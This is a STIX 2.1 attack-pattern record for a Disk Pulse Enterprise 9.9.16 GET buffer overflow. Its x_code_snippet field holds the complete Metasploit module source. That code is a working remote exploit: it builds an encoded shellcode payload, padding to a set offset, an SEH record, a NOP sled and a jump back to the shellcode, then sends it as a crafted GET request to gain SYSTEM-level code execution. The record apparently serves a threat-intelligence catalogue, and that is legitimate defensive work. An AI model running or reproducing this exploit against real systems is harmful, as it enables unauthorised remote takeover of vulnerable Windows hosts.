{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--810cc332-a44c-403f-9eac-7341395a0ceb",
    "created": "2024-08-14T16:52:31.335859Z",
    "modified": "2024-08-14T16:52:31.335863Z",
    "name": "Disk Pulse Enterprise GET Buffer Overflow",
    "description": "( This module exploits an SEH buffer overflow in Disk Pulse Enterprise 9.9.16. If a malicious user sends a crafted HTTP GET request it is possible to execute a payload that would run under the Windows NT AUTHORITY\\SYSTEM account. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/disk_pulse_enterprise_get.rb",
            "external_id": "disk_pulse_enterprise_get.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Disk Pulse Enterprise GET Buffer Overflow',\n      'Description'    => %q(\n        This module exploits an SEH buffer overflow in Disk Pulse Enterprise\n        9.9.16. If a malicious user sends a crafted HTTP GET request\n        it is possible to execute a payload that would run under the Windows\n        NT AUTHORITY\\SYSTEM account.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Chance Johnson', # msf module - albatross@loftwing.net\n          'Nipun Jaswal & Anurag Srivastava' # Original discovery -- www.pyramidcyber.com\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '42560' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'EncoderType' => \"alpha_mixed\",\n          'BadChars' => \"\\x00\\x0a\\x0d\\x26\"\n        },\n      'Targets'        =>\n        [\n          [ 'Disk Pulse Enterprise 9.9.16',\n            {\n              'Ret' => 0x1013ADDD, # POP EDI POP ESI RET 04 -- libpal.dll\n              'Offset' => 2492\n            }]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-08-25',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(80)])\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri'    =>  '/',\n      'method' =>  'GET'\n    )\n\n    if res && res.code == 200 && res.body =~ /Disk Pulse Enterprise v9\\.9\\.16/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Generating exploit...\")\n    exp = payload.encoded\n    exp << 'A' * (target['Offset'] - payload.encoded.length) # buffer of trash until we get to offset\n    exp << generate_seh_record(target.ret)\n    exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode\n    exp << \"\\xE9\\x25\\xBF\\xFF\\xFF\" # jmp 0xffffbf2a - jmp back to shellcode start\n    exp << 'B' * (5000 - exp.length) # padding\n\n    print_status(\"Sending exploit...\")\n\n    send_request_cgi(\n      'uri' =>  '/../' + exp,\n      'method' =>  'GET',\n      'host' =>  '4.2.2.2',\n      'connection' =>  'keep-alive'\n    )\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-08-25",
    "x_mitre_platforms": [
        "win'"
    ]
}